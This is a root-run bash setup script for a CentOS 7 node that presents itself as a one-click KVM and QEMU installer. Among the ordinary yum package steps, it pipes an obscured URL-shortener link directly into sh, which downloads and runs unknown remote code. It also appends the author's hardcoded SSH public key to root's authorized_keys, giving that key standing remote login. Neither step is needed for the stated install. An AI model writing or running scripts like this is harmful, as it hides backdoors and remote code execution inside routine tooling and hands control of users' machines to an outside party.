#!/bin/bash
#by scanf
#setup 204lab workstation cloud compute node environment.
#System Required: CentOS 7

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH


clear
echo
echo "#############################################################"
echo "# One click Install kvm                                     #"
echo "# Intro: https://www.scanfsec.com/                          #"
echo "# Author: scanf <scanf@scanfsec.com>   					  #"
echo "#############################################################"
echo

# Make sure only root can run our script
[[ $EUID -ne 0 ]] && echo -e "[${red}Error${plain}] This script must be run as root!" && exit 1

#Update
yum -y update && yum -y updage

#Install htop
yum -y install epel-release
yum -y install htop

#Install kvm and qemu.
wget -O - https://clck.ru/9V9fH | sh
yum -y install kvm qemu-kvm qemu-kvm-tools libvirt libguestfs-tools virt-install

#add authorized_keys
cat<<_EOF_>>~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6egAo9Fws/ULWy/98518SNlOkNnGbf/zwwzxSOJnOBnHKNs1NBK97tiqeyj/8GYgfVA+HDjKK2x6UGLPWZZiTwvmHAilX6Zt6AiPBrgTXIZPZW6hyDonRBi/+3P5LLTvq7QqIpWq6Ndsa8896otCRdW0g+uzD8UmIg7w0M45R/mphE/kh0VK0wqbXohtMhVmPCUcStTq21cLvLvEhR8xa5Zpe9kSAKytEAxgGwdvz0dyI0sYdMLtb8BxyGGFXj9rhNbOJas3gYJWVNRVOlRqbBpK7kxBL+/P6QVl/4AtNEGzp1prnqCHTGgeq6m8mWDh+6aXYO8/DJ6iYoD/ywYBX scanf@scanfsec.com
_EOF_

chmod 0600 ~/.ssh/authorized_keys

echo 
echo "#############################################################"
echo "# Install complete.                                         #"
echo "#############################################################"
echo